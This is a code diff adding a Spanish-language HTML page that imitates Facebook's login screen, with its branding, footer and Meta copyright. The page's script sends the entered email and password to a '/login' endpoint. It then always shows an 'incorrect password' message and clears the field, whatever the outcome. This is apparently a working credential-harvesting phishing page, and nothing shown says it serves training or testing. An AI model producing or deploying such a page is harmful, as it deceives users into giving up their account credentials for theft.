@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Facebook - Inicia sesión o regístrate</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;min-height:100vh}
+.top-bar{background:#1877f2;height:56px;display:flex;align-items:center;padding:0 20px}
+.top-bar .fb-logo{color:#fff;font-size:28px;font-weight:700;letter-spacing:-1px;text-decoration:none}
+.center{display:flex;justify-content:center;padding:60px 20px 40px;gap:40px;flex-wrap:wrap;align-items:flex-start}
+.hero{max-width:430px;padding:20px 0}
+.hero h1{color:#1c1e21;font-size:28px;font-weight:400;line-height:1.3;margin-bottom:12px}
+.hero p{font-size:18px;color:#606770;line-height:1.4}
+.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:24px;width:396px;max-width:100%}
+.card input{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;outline:none;margin-bottom:12px;color:#1c1e21}
+.card input:focus{border-color:#1877f2;box-shadow:0 0 0 2px rgba(24,119,242,.2)}
+.btn-login{width:100%;background:#1877f2;color:#fff;border:none;border-radius:6px;padding:14px;font-size:20px;font-weight:700;cursor:pointer;margin-bottom:16px}
+.btn-login:hover{background:#166fe5}
+.or{text-align:center;margin:12px 0;position:relative;color:#606770}
+.or::before,.or::after{content:'';position:absolute;top:50%;width:42%;height:1px;background:#dddfe2}
+.or::before{left:0}
+.or::after{right:0}
+.btn-create{display:block;width:fit-content;margin:0 auto;background:#42b72a;color:#fff;border:none;border-radius:6px;padding:14px 24px;font-size:17px;font-weight:700;cursor:pointer}
+.btn-create:hover{background:#36a420}
+.forgot{display:block;text-align:center;font-size:14px;color:#1877f2;margin-bottom:20px;text-decoration:none}
+.error{background:#fce8e6;color:#c62828;padding:10px 12px;border-radius:4px;font-size:13px;margin-bottom:10px;display:none}
+.footer{text-align:center;padding:20px;color:#606770;font-size:13px;max-width:900px;margin:0 auto}
+.footer a{color:#606770;margin:0 6px}
+</style>
+</head>
+<body>
+<div class="top-bar">
+  <a class="fb-logo" href="#">facebook</a>
+</div>
+
+<div class="center">
+  <div class="hero">
+    <h1>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</h1>
+  </div>
+
+  <div class="card">
+    <div class="error" id="error">La contraseña que has introducido es incorrecta.</div>
+    <form id="loginForm">
+      <input type="text" id="email" name="email" placeholder="Correo electrónico o número de teléfono" autocomplete="email" required>
+      <input type="password" id="password" name="password" placeholder="Contraseña" autocomplete="current-password" required>
+      <button type="submit" class="btn-login">Iniciar sesión</button>
+    </form>
+    <a href="#" class="forgot">¿Has olvidado tu contraseña?</a>
+    <div class="or">o</div>
+    <br>
+    <button class="btn-create">Crear cuenta nueva</button>
+  </div>
+</div>
+
+<div class="footer">
+  <a href="#">Español (España)</a>
+  <br><br>
+  <a href="#">Privacidad</a>
+  <a href="#">Condiciones</a>
+  <a href="#">Publicidad</a>
+  <a href="#">Opciones de anuncios</a>
+  <a href="#">Cookies</a>
+  <a href="#">Más</a>
+  <br><br>
+  Meta © 2024
+</div>
+
+<script>
+document.getElementById('loginForm').addEventListener('submit',function(e){
+  e.preventDefault();
+  var em=document.getElementById('email').value;
+  var pw=document.getElementById('password').value;
+  fetch('/login',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},
+    body:'email='+encodeURIComponent(em)+'&password='+encodeURIComponent(pw)})
+  .then(function(){
+    document.getElementById('error').style.display='block';
+    document.getElementById('password').value='';
+  }).catch(function(){
+    document.getElementById('error').style.display='block';
+  });
+});
+</script>
+</body>
+</html>
